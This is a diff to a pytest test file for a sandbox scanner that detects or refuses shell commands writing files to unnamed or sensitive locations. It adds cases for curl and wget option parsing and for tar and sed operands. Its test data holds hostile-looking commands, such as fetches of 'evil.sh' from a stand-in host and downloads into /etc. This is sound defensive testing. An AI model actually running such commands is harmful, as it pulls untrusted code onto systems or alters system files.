@@ -414,20 +414,28 @@ class TestUnnamedWriteTargets:
     ``curl -O`` / ``wget URL`` write a *remote-derived* filename into the
     sandbox cwd; the name cannot be statically resolved, so per the module's
     fail-closed contract they must be refused, not passed with empty targets.
-    ``--output-dir`` / ``-P`` / wget's ``-o`` log are nameable targets that
-    were silently dropped.
+    ``--output-dir`` / ``-P`` confine the write to a named directory;
+    ``sed --`` / tar ``--delete`` name an operand the handlers had dropped.
     """
 
     @pytest.mark.parametrize("command", [
         "curl -O http://h/evil.sh",
         "curl --remote-name http://h/evil.sh",
         "curl -sO http://h/evil.sh",
+        "curl -J http://h/evil.sh",
         "curl -O --output-dir /etc http://h/x",
         "wget http://h/evil.sh",
         "wget -q http://h/evil.sh",
+        # wget's `-o` is a *log* file; it does not name the download, so the
+        # download is still remote-derived and must be refused.
+        "wget -o /tmp/wget.log http://h/x",
+        "wget --output-file=/var/log/w.log http://h/x",
+        # A `--spider` consumed as another option's value is not spider mode.
+        "wget --user-agent --spider http://h/x",
     ])
     def test_remote_derived_write_is_refused(self, command: str) -> None:
-        assert scan_shell_write_targets(command).refuse_reason is not None
+        scan = scan_shell_write_targets(command)
+        assert scan.refuse_reason is not None, f"{command!r} was not refused"
 
     def test_curl_to_stdout_is_not_a_write(self) -> None:
         # curl with no `-o`/`-O` streams to stdout — nothing to check.
@@ -436,15 +444,34 @@ class TestUnnamedWriteTargets:
     def test_wget_spider_is_not_a_write(self) -> None:
         assert scan_shell_write_targets("wget --spider http://h/x").refuse_reason is None
 
+    def test_wget_log_plus_named_output_still_records_both(self) -> None:
+        scan = scan_shell_write_targets("wget -o /tmp/log -O /tmp/out http://h/x")
+        assert scan.refuse_reason is None
+        assert "/tmp/out" in scan.targets
+
+    @pytest.mark.parametrize("command", [
+        # A value that looks like a flag is an argument, not an option.
+        "curl -d -O http://h/x",
+        "curl -d -J http://h/x",
+        "curl --data -O http://h/x",
+        "curl -u -O http://h/x",
+        "curl -H -Origin http://h/x",
+        "curl -d --remote-name http://h/x",
+    ])
+    def test_option_value_that_looks_like_a_flag(self, command: str) -> None:
+        # Regression from the first unnamed-write pass: the option scan read
+        # each token in isolation, so `-O` used as `-d`'s POST data was taken
+        # for a remote-name flag and the benign command was refused.
+        assert scan_shell_write_targets(command).refuse_reason is None
+
     @pytest.mark.parametrize("command,expected", [
-        ("wget -o /tmp/wget.log http://h/x", "/tmp/wget.log"),
-        ("wget --output-file=/var/log/w.log http://h/x", "/var/log/w.log"),
         ("wget -P /etc http://h/x", "/etc"),
         ("wget --directory-prefix=/etc http://h/x", "/etc"),
         ("curl --output-dir /etc http://h/x", "/etc"),
         ("curl --output-dir=/etc http://h/x", "/etc"),
         ("sed -i -- /etc/weird", "/etc/weird"),
         ("tar --delete --file=/etc/x.tar m", "/etc/x.tar"),
+        ("tar --delete -f /etc/x.tar m", "/etc/x.tar"),
     ])
     def test_named_target_option_is_detected(
         self, command: str, expected: str
